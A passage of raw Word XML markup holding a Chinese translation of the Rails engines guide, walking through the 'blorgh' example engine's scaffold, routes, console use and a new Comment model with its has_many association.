          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/javascripts/blorgh/posts.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/javascripts/blorgh/posts.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。你会在随后看到怎样使用它们。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604B3D6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默认情况，脚手架样式不会应用到 engine 作为 engine 的 ‘layout’ 文件， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/application.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 不会导入它。要使这个应用生效，插入这行到这个 ‘layout’ 的 标签：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="58EEE7D6" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="417FA522" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1192064914"/>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stylesheet_link_tag "scaffold"</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6040D87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你可以看见 engine 到现在有些什么通过在你的 engine 的根目录运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来运行被脚手架创建器创建的迁移，然后在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/dummy</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。当你打开 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>http://localhost:3000/blorgh/posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 你将会看到被创建的默认的 ’scaffold’。点击四周！你刚刚创建的你第一个 engine 的功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BCC09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如果你更愿意在控制台中玩耍，</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails console</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会像 Rails 应用程序的那样工作。记住： </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模型被名称空间化了，因此引用它你必须这样调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::Post</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">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3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="066E7992" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E34602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&gt;&gt; Blorgh::Post.find(1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A58A99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=&gt; #&lt;Blorgh::Post id: 1 ...&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="573A919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最后一件事情是这个 engine的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 资源应该是engine 的根目录。无论何人来到 engine挂载的根目录，他们应该看到一个文章列表。如果下面这行被插入了 engine 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3000"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="3D81A5B5" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7CF0D0A8" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="163711287"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>root :to</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "posts#index"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="31BEE12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现在人们仅仅需要来到 engine 的根目录来查看所有文章，而不是访问 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。这里的意思是替代 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>http://localhost:3000/blorgh/posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，现在你仅仅需要到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>http://localhost:3000/blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D06B31"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3.2 创建一个 comments 资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10ACD7F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现在 engine 能够创建新的 blog 文章，它还需要添加评论功能才会有意义。要得到这样的功能，你将需要创建一个 comment 模型，一个 comment 控制器以及修改 post scaffold 来显示评论和允许人们创建新的评论。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E7170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运行 model 创建器并且告诉它创建一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Comment</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模型，以及相应的表有两个字段：一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>post_id</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> integer型 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>text</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> text型 字段。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0BD04DD0" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="296B134E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="313607141"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails generate model Comment post_id:integer text:text</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5145DA1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这将会输出随后内容：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1BFD3927" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7FCB65C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active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="390DB9C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db/migrate/[timestamp]_create_blorgh_comments.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E9CB94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app/models/blorgh/comment.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D7C6BD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test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69415CB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test/unit/blorgh/comment_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B8F856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test/fixtures/blorgh/comments.yml</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5C864F4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这个创建器调用将会仅仅创建需要的 ‘model’ 文件。名称空间文件在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录下以及一个名叫 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::Comment</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的类。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279B526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要在一篇文章中显示评论，编辑 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并且添加这行在 “Edit” 链接 前面：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1995855D" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0CB4C81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&lt;h3&gt;Comments&lt;/h3&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E6D7E5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render @post.comments %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1829F08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这行将会在这里 require 被定义在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::Post</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模型中对应于评论的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 关系，现在这还没弄好。要定义一个（关系），打开 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/models/blorgh/post.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并且添加这行到 ’model’：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4B571DF2" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1BFCC67B" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2104255104"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>has_many :comments</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6824AEC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转到 ‘model’ 这样输入：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4200"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="6D1BDBA9" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62519DF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module</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
